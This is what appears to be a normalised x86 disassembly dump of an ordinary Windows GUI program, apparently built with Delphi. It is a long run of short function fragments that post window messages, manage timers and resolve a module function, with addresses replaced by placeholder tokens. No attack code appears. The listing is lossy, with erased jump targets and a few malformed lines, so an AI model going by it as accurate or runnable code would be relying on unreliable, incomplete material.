pop ebp
retn
sub_457500
jmp sub_403a98
sub_457507
pop ebp
retn
sub_459e48
mov eax [ rw-data ]
retn
sub_459e50
mov [ rw-data ] eax
retn
j_sub_4037e4#5
jmp sub_4037e4
sub_459fcf
jmp sub_403a98
sub_459fd6
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_45a2de
jmp sub_403a98
sub_45a2e5
mov eax ebx
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_45a389
jmp sub_403a98
sub_45a390
mov eax ebx
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_45a420
mov al [ eax + 0x1f ]
xor al 0x1
retn
sub_45ab4c
cmp edx [ eax + 0x28 ]
je r-xdata
retn
mov [ eax + 0x28 ] edx
mov [ eax + 0x2c ] 0x0
mov [ eax + 0x44 ] 0x1
mov eax [ eax + 0x4 ]
call sub_45b1f8
sub_45ab68
cmp dl [ eax + 0x2c ]
je r-xdata
retn
mov [ eax + 0x2c ] dl
test dl dl
je r-xdata
mov edx 0xff000014
call sub_45ab4c
sub_45ac88
cmp dl [ eax + 0x34 ]
je r-xdata
retn
mov [ eax + 0x34 ] dl
mov [ eax + 0x44 ] 0x1
mov eax [ eax + 0x4 ]
call sub_45b1f8
sub_45aca0
cmp edx [ eax + 0x38 ]
je r-xdata
retn
mov [ eax + 0x38 ] edx
mov [ eax + 0x44 ] 0x1
mov eax [ eax + 0x4 ]
call sub_45b1f8
sub_45acb8
mov ecx edx
mov [ eax + 0x10 ] ecx
test ecx ecx
jge r-xdata
mov eax [ eax + 0x4 ]
call sub_45b1f8
retn
xor edx edx
mov [ eax + 0x10 ] edx
sub_45ace4
mov eax [ eax + 0x4 ]
mov al [ eax + 0x210 ]
xor al 0x1
retn
sub_45acf0
mov [ eax + 0x1c ] dl
mov eax [ eax + 0x4 ]
call sub_45b1f8
retn
sub_45afd0
push ebx
mov ebx edx
mov edx ebx
call sub_445c10
and [ ebx + 0x24 ] 0xfffffffc
pop ebx
retn
sub_45b040
cmp [ eax + 0x5c ] 0x0
jne r-xdata
xor eax eax
retn
cmp [ eax + 0x1a8 ] 0x0
je r-xdata
mov al 0x1
retn
cmp [ eax + 0x1a7 ] 0x0
je r-xdata
sub_45b168
jmp sub_403a98
sub_45b16f
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_45b178
push ebx
mov ebx eax
cmp [ ebx + 0x214 ] 0x0
jg r-xdata
pop ebx
retn
mov eax [ ebx + 0x208 ]
call sub_45a584
mov eax [ ebx + 0x20c ]
call sub_45a584
sub_45b1d8
push esi
mov esi eax
mov eax [ esi + 0x208 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
pop esi
retn
sub_45b1e8
push esi
mov esi eax
mov eax [ esi + 0x20c ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
pop esi
retn
sub_45b2e3
jmp sub_403a98
sub_45b2f0
test edx edx
je r-xdata
retn
test [ edx + 0x1c ] 0x1
jne r-xdata
test [ eax + 0x1c ] 0x1
jne r-xdata
call sub_45b308
sub_45b524
retn
sub_45b592
jmp sub_403a98
sub_45b5d1
jmp sub_403a98
sub_45b604
cmp [ edx + 0x8 ] 0x0
jne r-xdata
call sub_447108
retn
mov ecx [ eax + 0x208 ]
cmp [ ecx + 0x1c ] 0x0
je r-xdata
mov eax [ eax + 0x208 ]
call sub_45a810
retn
sub_45b628
cmp [ edx + 0x8 ] 0x0
jne r-xdata
call sub_447128
retn
mov ecx [ eax + 0x20c ]
cmp [ ecx + 0x1c ] 0x0
je r-xdata
mov eax [ eax + 0x20c ]
call sub_45a810
retn
sub_45b71d
jmp sub_403a98
sub_45b724
mov eax [ ebp - 0x4 ]
call sub_449088
test al al
je r-xdata
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
call sub_45a478
mov eax [ ebp - 0x4 ]
call sub_45b1f8
sub_45b7fc
cmp dl [ eax + 0x220 ]
je r-xdata
retn
mov [ eax + 0x220 ] dl
call sub_446324
sub_45b810
mov ecx [ eax ]
call [ ecx - 0x10 ]
retn
sub_45b950
jmp sub_403a98
sub_45b988
jmp sub_403a98
sub_45b98f
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45b9af
lea eax [ ebp - 0x114 ]
call sub_404094
retn
sub_45b9a8
jmp sub_403a98
sub_45b9af
mov eax [ ebp - 0x4 ]
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
pop ebx
mov esp ebp
pop ebp
retn
call sub_4036c0
pop [ fs : 0x0 ]
add esp 0xc
sub_45bcb6
jmp sub_403a98
sub_45bcbd
cmp [ ebp - 0x5 ] 0x0
jle r-xdata
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_4036b8
j_sub_4037e4#4
jmp sub_4037e4
sub_45bd8d
jmp sub_4037e4
sub_45bd92
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_46321c
call sub_403b4c
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_45c14a
jmp sub_403a98
sub_45c151
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_45c22c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
call sub_418190
mov [ ebx + 0x270 ] eax
pop esi
pop ebx
retn
sub_45c244
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_45c27c
mov edx eax
mov eax esi
call sub_419a18
pop esi
pop ebx
retn
sub_45c260
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_45d620
mov edx eax
mov eax esi
call sub_419a18
pop esi
pop ebx
retn
sub_45c27c
push ebx
mov ebx eax
mov eax ebx
call sub_45d2c0
mov edx r-xdata
call sub_41e08c
pop ebx
retn
sub_45c380
push ebx
mov ebx eax
mov eax ebx
call sub_45c390
xor al 0x1
pop ebx
retn
sub_45c390
cmp [ eax + 0x210 ] 0x0
jne r-xdata
mov al 0x1
retn
mov edx [ eax + 0x208 ]
cmp [ edx + 0x10 ] 0x0
jne r-xdata
mov eax [ eax + 0x20c ]
cmp [ eax + 0x10 ] 0x0
jne r-xdata
xor eax eax
retn
sub_45c3ec
push ebx
cmp [ eax + 0x292 ] 0x0
je r-xdata
pop ebx
retn
mov ecx edx
mov ebx eax
mov edx eax
mov eax [ ebx + 0x294 ]
call [ ebx + 0x290 ]
sub_45c40c
push ebx
cmp [ eax + 0x2b2 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x2b4 ]
call [ ebx + 0x2b0 ]
sub_45c42c
push ebx
cmp [ eax + 0x2ca ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x2cc ]
call [ ebx + 0x2c8 ]
sub_45c725
jmp sub_403a98
sub_45c72c
pop ecx
pop ebp
retn
sub_45c730
xor eax eax
retn
sub_45ca08
jmp sub_403a98
sub_45ca0f
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
call sub_403344
retn
sub_45ca25
jmp sub_403a98
sub_45cb0f
jmp sub_403a98
sub_45cb16
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45cb33
mov eax [ ebp - 0xc ]
call sub_403344
retn
sub_45cb2c
jmp sub_403a98
sub_45cb53
jmp sub_403a98
sub_45ce3e
jmp sub_403a98
sub_45cfd1
jmp sub_403a98
sub_45d2c0
mov eax [ eax + 0x238 ]
retn
sub_45d2c8
mov eax [ eax + 0x240 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
retn
sub_45d2d4
mov al [ eax + 0x5e ]
xor al 0x1
retn
sub_45d612
jmp sub_403a98
sub_45d619
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_45d620
mov eax [ eax + 0x25c ]
test eax eax
jne r-xdata
retn
mov eax [ rw-data ]
mov eax [ eax + 0x40 ]
sub_45d668
cmp dl [ eax + 0x230 ]
je r-xdata
retn
mov [ eax + 0x230 ] dl
test [ eax + 0x1c ] 0x10
jne r-xdata
call sub_446324
sub_45d684
cmp [ eax + 0x25c ] 0x0
setne al
retn
sub_45d6c0
push ebx
mov ebx eax
mov eax ebx
call sub_4482b8
mov eax [ ebx + 0x238 ]
test eax eax
je r-xdata
pop ebx
retn
mov eax [ eax + 0x14 ]
mov edx [ ebx + 0x70 ]
call sub_41d9c8
sub_45d744
push ebx
mov ebx eax
mov eax ebx
call sub_4482e0
mov eax [ ebx + 0x238 ]
test eax eax
je r-xdata
pop ebx
retn
mov edx [ ebx + 0x68 ]
call sub_41e130
sub_45d764
push ebx
mov ebx eax
mov eax ebx
call sub_45d384
mov edx [ ebx + 0x248 ]
mov eax ebx
call sub_45d44c
pop ebx
retn
sub_45df91
lea eax [ ebp - 0xb4 ]
call sub_404094
retn
sub_45df9d
jmp sub_403a98
j_sub_45df91
jmp sub_45df91
sub_45dfa4
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_45e0fc
jmp sub_403a98
sub_45e103
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_45e3e8
jmp sub_403a98
sub_45e3ef
mov eax [ rw-data ]
call sub_460ca0
mov bl 0x1
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_45e406
add [ eax ] al
retn
sub_45e664
push ebx
cmp [ eax + 0x2ba ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x2bc ]
call [ ebx + 0x2b8 ]
sub_45e684
mov eax [ eax + 0x240 ]
call sub_423f74
test eax eax
jne r-xdata
retn
mov eax [ rw-data ]
call sub_462ad0
sub_45e72b
jmp sub_403a98
sub_45e732
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45e755
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x238 ]
call sub_41e108
retn
sub_45e74e
jmp sub_403a98
sub_45e755
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_45e914
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_45e684
mov [ esi + 0xc ] eax
pop esi
pop ebx
retn
sub_45eb7c
mov ecx [ eax + 0x248 ]
test ecx ecx
je r-xdata
retn
mov edx [ edx + 0x4 ]
mov eax ecx
call sub_455d94
sub_45ec67
jmp sub_403a98
sub_45ec6e
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_45ec74
cmp [ eax + 0x22f ] 0x2
jne r-xdata
cmp [ edx + 0x4 ] 0x0
setne dl
call sub_45e45c
test [ eax + 0x1c ] 0x10
je r-xdata
retn
sub_45eccc
call sub_45f9f4
retn
sub_45f119
jmp sub_403a98
sub_45f120
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_45f41c
jmp sub_4037e4
j_sub_4037e4#3
jmp sub_4037e4
sub_45f8b1
jmp sub_403a98
sub_45f8b8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45f8d5
lea eax [ ebp - 0x8 ]
call sub_404094
retn
sub_45f8ce
jmp sub_403a98
sub_45f8d5
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_45f8dc
push ebx
mov ebx eax
mov eax [ ebx + 0x240 ]
call sub_423f74
test eax eax
jne r-xdata
pop ebx
retn
xor edx edx
mov eax ebx
call sub_45c324
sub_45f8fc
call sub_403344
retn
sub_45f954
mov ecx [ eax ]
call [ ecx - 0x10 ]
retn
sub_45f9ba
jmp sub_403a98
sub_45fb68
jmp sub_4037e4
sub_45fb94
xor edx edx
call sub_45c688
retn
sub_45fb9c
push ebx
mov ebx eax
mov dl 0x1
mov eax ebx
call sub_45c688
mov eax ebx
call sub_4427b0
pop ebx
retn
sub_45fc22
jmp sub_403a98
sub_45fc29
pop ebx
pop ecx
pop ebp
retn
sub_45fc30
push ebx
mov ebx eax
push 0x0
push 0x0
push 0xb021
mov eax ebx
call sub_448d84
push eax
call PostMessageA
pop ebx
retn
sub_45fe34
jmp sub_403a98
sub_45fed5
jmp sub_403a98
sub_45fedf
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45fefe
mov eax [ rw-data ]
call sub_4621a8
retn
sub_45fef7
jmp sub_403a98
sub_45fefe
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45ff1b
lea eax [ ebp - 0x20 ]
call sub_404094
retn
sub_45ff14
jmp sub_403a98
sub_45ff1b
mov eax [ ebp - 0x8 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_45fffc
cmp [ eax + 0x30 ] 0x0
jne r-xdata
call sub_44195c
retn
mov edx eax
mov eax [ rw-data ]
call sub_4617fc
retn
sub_460380
mov edx eax
mov eax [ rw-data ]
call sub_46321c
mov al 0x1
retn
sub_460468
cmp dl [ eax + 0x2e0 ]
je r-xdata
retn
mov [ eax + 0x2e0 ] dl
call sub_460390
sub_46047c
cmp dl [ eax + 0x2e1 ]
je r-xdata
retn
mov [ eax + 0x2e1 ] dl
call sub_460390
sub_460490
cmp edx [ eax + 0x2ec ]
je r-xdata
retn
mov [ eax + 0x2ec ] edx
call sub_460390
sub_4604a4
cmp dl [ eax + 0x2e8 ]
je r-xdata
retn
mov [ eax + 0x2e8 ] dl
call sub_460390
sub_4604b8
test [ eax + 0x1c ] 0x10
jne r-xdata
retn
cmp [ rw-data ] 0x0
je r-xdata
cmp [ eax + 0x2e0 ] 0x0
jne r-xdata
or [ edx + 0x8 ] 0x80000
cmp [ eax + 0x2e8 ] 0x0
je r-xdata
sub_460623
jmp sub_403a98
sub_46062a
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_460630
push ebx
mov ebx eax
mov eax ebx
call sub_44769c
mov eax ebx
call sub_447820
test eax eax
jne r-xdata
pop ebx
retn
mov eax ebx
call sub_45fc30
sub_4608a6
jmp sub_403a98
sub_4608ad
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4608b4
push ebx
mov ebx edx
mov edx ebx
call sub_447b04
mov eax [ ebx + 0x8 ]
xor edx edx
call sub_441a64
pop ebx
retn
sub_460908
push ebx
add esp 0xfffffff0
mov ebx eax
mov edx esp
mov eax ebx
call sub_460970
mov eax [ esp ]
add esp 0x10
pop ebx
retn
sub_460920
push ebx
add esp 0xfffffff0
mov ebx eax
mov edx esp
mov eax ebx
call sub_460970
mov eax [ esp + 0xc ]
sub eax [ esp + 0x4 ]
add esp 0x10
pop ebx
retn
sub_46093c
push ebx
add esp 0xfffffff0
mov ebx eax
mov edx esp
mov eax ebx
call sub_460970
mov eax [ esp + 0x4 ]
add esp 0x10
pop ebx
retn
sub_460954
push ebx
add esp 0xfffffff0
mov ebx eax
mov edx esp
mov eax ebx
call sub_460970
mov eax [ esp + 0x8 ]
sub eax [ esp ]
add esp 0x10
pop ebx
retn
sub_460bf0
push 0x1
mov eax [ rw-data ]
mov eax [ eax ]
call eax
retn
sub_460bfc
push 0x0
mov eax [ rw-data ]
mov eax [ eax ]
call eax
retn
sub_460c08
push 0x4d
mov eax [ rw-data ]
mov eax [ eax ]
call eax
retn
sub_460c14
push 0x4c
mov eax [ rw-data ]
mov eax [ eax ]
call eax
retn
sub_460c20
push 0x4f
mov eax [ rw-data ]
mov eax [ eax ]
call eax
retn
sub_460c2c
push 0x4e
mov eax [ rw-data ]
mov eax [ eax ]
call eax
retn
sub_460c38
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x58 ]
call sub_4143bc
pop esi
pop ebx
retn
sub_460c4c
mov edx [ eax + 0x58 ]
mov edx [ edx + 0x8 ]
test edx edx
jne r-xdata
mov eax edx
retn
push 0x50
mov eax [ rw-data ]
mov eax [ eax ]
call eax
retn
sub_460c68
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x4c ]
call sub_4143bc
pop esi
pop ebx
retn
sub_460c7c
mov eax [ eax + 0x4c ]
mov eax [ eax + 0x8 ]
retn
sub_460c84
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x50 ]
call sub_4143bc
pop esi
pop ebx
retn
sub_460c98
mov eax [ eax + 0x50 ]
mov eax [ eax + 0x8 ]
retn
sub_460d74
mov eax [ eax + 0x54 ]
call sub_414210
retn
sub_460d80
mov eax [ eax + 0x54 ]
call sub_414500
retn
sub_46101b
jmp sub_403a98
sub_46105f
jmp sub_403a98
sub_461066
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn
sub_4610b4
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_460eb4
mov eax esi
mov edx [ ebx + 0x38 ]
call sub_4040e8
pop esi
pop ebx
retn
sub_461120
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x54 ]
call sub_4143bc
pop esi
pop ebx
retn
sub_461134
mov eax [ eax + 0x54 ]
mov eax [ eax + 0x8 ]
retn
sub_461381
jmp sub_403a98
sub_461388
pop ebx
mov esp ebp
pop ebp
retn
sub_461390
inc [ eax + 0x8c ]
retn
sub_461398
dec [ eax + 0x8c ]
cmp [ eax + 0x8c ] 0x0
jne r-xdata
retn
test [ eax + 0x8e ] 0x10
je r-xdata
call sub_4613b8
sub_4613b8
xor edx edx
call sub_4617fc
retn
sub_4617ee
jmp sub_403a98
sub_461875
jmp sub_403a98
sub_461884
add eax 0x30
call sub_40d6a0
retn
sub_4618c8
jmp r-xdata
test eax eax
je r-xdata
test eax eax
je r-xdata
cmp [ eax + 0x99 ] 0x0
je r-xdata
retn
test [ eax + 0x1c ] 0x10
je r-xdata
mov eax [ eax + 0x30 ]
xor eax eax
j_sub_4037e4#2
jmp sub_4037e4
sub_46191e
mov edx [ rw-data ]
mov eax [ rw-data ]
call sub_46321c
call sub_403b4c
pop edi
pop esi
pop ebx
pop ebp
retn 0x10
sub_461fed
jmp sub_403a98
sub_461ff4
pop ebx
mov esp ebp
pop ebp
retn
sub_46217c
push ebx
inc [ eax + 0xb8 ]
cmp [ eax + 0xb8 ] 0x1
jne r-xdata
pop ebx
retn
cmp [ eax + 0xe2 ] 0x0
je r-xdata
mov ebx eax
mov edx eax
mov eax [ ebx + 0xe4 ]
call [ ebx + 0xe0 ]
sub_4621a8
push ebx
dec [ eax + 0xb8 ]
cmp [ eax + 0xb8 ] 0x0
jne r-xdata
pop ebx
retn
cmp [ eax + 0xea ] 0x0
je r-xdata
mov ebx eax
mov edx eax
mov eax [ ebx + 0xec ]
call [ ebx + 0xe8 ]
sub_4621d4
xor edx edx
call sub_4620cc
retn
sub_4621dc
mov dl 0x1
call sub_4620cc
retn
sub_462250
mov edx [ rw-data ]
cmp [ edx + 0xd ] 0x0
je r-xdata
xor eax eax
retn
cmp [ eax + 0x34 ] 0x0
jne r-xdata
mov al 0x1
retn
sub_462268
mov edx [ rw-data ]
cmp [ edx + 0xd ] 0x0
je r-xdata
xor eax eax
retn
cmp [ eax + 0x34 ] 0x1
je r-xdata
mov al 0x1
retn
sub_462335
jmp sub_403a98
sub_46233c
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_462a86
jmp sub_4037e4
sub_463084
push ebx
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
pop ebx
retn
mov ebx [ rw-data ]
mov ebx [ ebx ]
call ebx
j_sub_4037e4#7
jmp sub_4037e4
j_sub_4037e4
jmp sub_4037e4
sub_4631fa
jmp sub_403a98
sub_463201
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_463208
call sub_40d1f0
test al al
je r-xdata
retn
push 0x0
call PostQuitMessage
sub_463401
jmp sub_403a98
sub_463408
mov eax [ ebp - 0x8 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_4634cf
jmp sub_403a98
sub_4634d6
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4636ac
jmp sub_403a98
sub_4636b3
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_463714
jmp sub_403a98
sub_46371b
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_463724
call sub_4634ec
retn
sub_46390f
jmp sub_4037e4
sub_463968
jmp sub_403a98
sub_46396f
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_463a9d
jmp sub_403a98
sub_463bfc
push ebx
mov ebx eax
mov ax [ ebx + 0x8a ]
test ax ax
je r-xdata
pop ebx
retn
movzx eax ax
push eax
push 0x0
call KillTimer
mov [ ebx + 0x8a ] 0x0
sub_463efb
jmp sub_403a98
sub_463f2a
jmp sub_403a98
sub_464036
jmp sub_403a98
sub_46403d
mov eax [ ebp - 0x4 ]
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_4643ce
jmp sub_403a98
sub_4643d5
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_464418
cmp [ eax + 0xa4 ] 0x0
jne r-xdata
mov eax [ eax + 0xb0 ]
retn
push 0x0
push 0x1
push 0xb031
mov eax [ eax + 0x30 ]
push eax
call SendMessageA
retn
sub_464548
push ebx
push r-xdata
call GetModuleHandleA
mov ebx eax
test ebx ebx
je r-xdata
pop ebx
retn
push r-xdata
push ebx
call GetProcAddress
mov [ rw-data ] eax
sub_464593
add [ edx ] ch
push 0x0
push 0x0
mov eax [ eax + 0x30 ]
push eax
call PostMessageA
retn
sub_4645a4
mov edx [ rw-data ]
mov [ edx + 0x4 ] eax
mov [ edx ] r-xdata
retn
sub_4645b4
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov [ eax + 0x4 ] edx
retn
sub_464627
jmp sub_403a98
sub_46462e
pop ebp
retn
sub_464630
sub [ rw-data ] 0x1
jae r-xdata
retn
mov eax sub_4645c4
call sub_403e68
call sub_464548
push r-xdata
call RegisterWindowMessageA
mov [ rw-data ] eax
mov eax sub_45a124
call sub_413e60
sub_464b08
push ebx
cmp [ eax + 0x32 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov eax [ ebx + 0x34 ]
call [ ebx + 0x30 ]
sub_464b1c
push ebx
cmp [ eax + 0x3a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov eax [ ebx + 0x3c ]
call [ ebx + 0x38 ]
sub_464b30
push ebx
cmp [ eax + 0x72 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov eax [ ebx + 0x74 ]
call [ ebx + 0x70 ]
sub_464b44
push ebx
cmp [ eax + 0x6a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov eax [ ebx + 0x6c ]
call [ ebx + 0x68 ]
sub_464c12
jmp sub_403a98
sub_464c20
push ebx
cmp [ eax + 0x62 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov eax [ ebx + 0x64 ]
call [ ebx + 0x60 ]
sub_464c34
push ebx
cmp [ eax + 0x4a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov eax [ ebx + 0x4c ]
call [ ebx + 0x48 ]
sub_464c48
push ebx
cmp [ eax + 0x7a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov eax [ ebx + 0x7c ]
call [ ebx + 0x78 ]
sub_464c5c
push ebx
cmp [ eax + 0x82 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov eax [ ebx + 0x84 ]
call [ ebx + 0x80 ]
sub_464c78
push ebx
cmp [ eax + 0x8a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov eax [ ebx + 0x8c ]
call [ ebx + 0x88 ]
sub_464ce8
push ebx
cmp [ eax + 0xa2 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov eax [ ebx + 0xa4 ]
call [ ebx + 0xa0 ]
sub_464d04
push ebx
cmp [ eax + 0xaa ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov eax [ ebx + 0xac ]
call [ ebx + 0xa8 ]
sub_464d40
inc [ eax + 0x3c ]
retn
sub_465064
jmp sub_403a98
sub_46506b
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4650e0
jmp sub_403a98
sub_4650e7
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_465157
jmp sub_403a98
sub_46515e
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4651cb
jmp sub_403a98
sub_4651d2
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_465287
jmp sub_403a98
sub_46528e
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_46531d
jmp sub_403a98
sub_465324
mov al [ ebp - 0x5 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x4
sub_465397
jmp sub_403a98
sub_46539e
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_465410
jmp sub_403a98
sub_465417
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_46548c
jmp sub_403a98
sub_465493
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_465503
jmp sub_403a98
sub_46550a
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_465577
jmp sub_403a98
sub_46557e
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4655f0
jmp sub_403a98
sub_4655f7
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_465670
jmp sub_403a98
sub_465677
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
sub_4656f4
jmp sub_403a98
sub_4656fb
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
sub_465754
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x30 ]
call sub_424d00
pop esi
pop ebx
retn
sub_465768
mov eax [ eax + 0x30 ]
mov eax [ eax + 0x8 ]
retn
sub_4657d7
jmp sub_403a98
sub_4657de
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_46584b
jmp sub_403a98
sub_465852
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_46587d
jmp sub_403a98
sub_465884
pop ebp
retn
sub_465888
sub [ rw-data ] 0x1
jae r-xdata
retn
mov edx [ r-xdata ]
mov eax [ r-xdata ]
call sub_413bf4
mov ecx [ rw-data ]
mov ecx [ ecx ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_464d44
mov [ rw-data ] eax
sub_465cda
jmp sub_403a98
sub_465ce1
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_465e59
jmp sub_403a98
sub_465e60
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_465ead
jmp sub_403a98
sub_465eb4
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4660c5
jmp sub_403a98
sub_4660cc
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x10
sub_46629e
jmp sub_403a98
sub_4662a5
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_4662d5
jmp sub_403a98
sub_4662dc
pop ebp
retn
sub_4662e0
sub [ rw-data ] 0x1
retn
sub_466b32
[ eax + eax ]
sub_466fc8
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_443c20
movsx eax [ esi + 0x8 ]
mov [ ebx + 0x234 ] eax
pop esi
pop ebx
retn
sub_467044
push ebx
mov ebx eax
mov eax ebx
call sub_4474b8
mov eax ebx
call sub_4673e4
test al al
je r-xdata
pop ebx
retn
mov eax ebx
call sub_467874
sub_4670c0
jmp sub_403a98
sub_4670c7
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_467120
jmp sub_403a98
sub_467127
mov eax ebx
pop ebx
pop ecx
pop ebp
retn
sub_4671b4
jmp sub_403a98
sub_4671bb
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_4672ba
jmp sub_403a98
sub_4672c1
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4673d6
jmp sub_403a98
sub_4673dd
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4673e4
push ebx
mov ebx eax
cmp [ ebx + 0x220 ] 0x0
setne al
pop ebx
retn
sub_4674a9
jmp sub_403a98
sub_4674b0
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_467584
mov eax [ eax + 0x208 ]
retn
sub_4677d2
jmp sub_403a98
sub_467864
jmp sub_403a98
sub_46786b
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4678b4
xor edx edx
call sub_4671c4
retn
sub_4678bc
mov al 0x1
retn
sub_467aad
jmp sub_403a98
sub_467ab4
mov al [ ebp - 0x1 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_467c9a
jmp sub_403a98
sub_467ca1
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_467ce0
push ebx
mov ebx eax
mov eax edx
dec eax
mov edx eax
mov eax ebx
call sub_467d24
mov edx eax
mov eax ebx
call sub_467604
pop ebx
retn
sub_467f34
jmp sub_403a98
sub_467f3b
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_467fc7
jmp sub_403a98
sub_467fce
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_468055
jmp sub_403a98
sub_46805c
pop ebx
mov esp ebp
pop ebp
retn
sub_468162
jmp sub_403a98
sub_468169
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_4683ba
jmp sub_403a98
sub_4683c1
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_468464
mov edx [ rw-data ]
cmp [ edx + 0x4 ] 0x11
jne r-xdata
xor eax eax
retn
add al 0x5f
sub al 0x3f
jb r-xdata
mov al 0x1
retn
sub_46854a
jmp sub_403a98
